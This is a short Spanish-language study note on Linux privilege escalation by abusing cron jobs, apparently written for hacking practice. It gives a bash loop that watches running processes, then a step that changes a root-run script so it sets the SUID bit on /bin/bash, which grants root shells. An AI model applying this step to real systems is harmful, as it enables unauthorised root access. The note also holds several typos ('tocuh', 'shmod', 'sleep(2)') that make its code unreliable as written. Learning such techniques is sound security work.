___
- tags: #abusing_privilege #cron
___
## Tarea Cron
Es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo **corntab** que especifica qué comandos deben ejecutarse y cuándo deben ejecutarse.
## Detección
La detección y explotación de tareas cron es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. 
Ahora bien, para detectar tareas cron, los atacantes pueden utilizar herramientas como **Pspy**. Pspy es una herramienta de línea de comandos que monitorea las tareas que se ejecutan en segundo plano en un sistema Unix/Linux y muestra las nuevas tareas que se inician.

## Paso a paso
### Creando archivo para detección de tareas
```shell
tocuh procmon.sh
chmod +x procmon.sh
```

### Reviso los usuarios, comandos que se ejecutan
```shell
ps -eo user,command
```

### procomon.sh
```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
        new_process=$(ps -eo user,command)
        diff<(echo "$old_process") <(echo"$new_process") |grep "[\>\<]" | grep -vE "procmon|command|kworker"
        old_process=$new_process
done
```

### Modifico el script.sh
Le doi permisos de super usuario a la bash
```bash
#!/bin/bash

sleep(2)
shmod u+s /bin/bash
```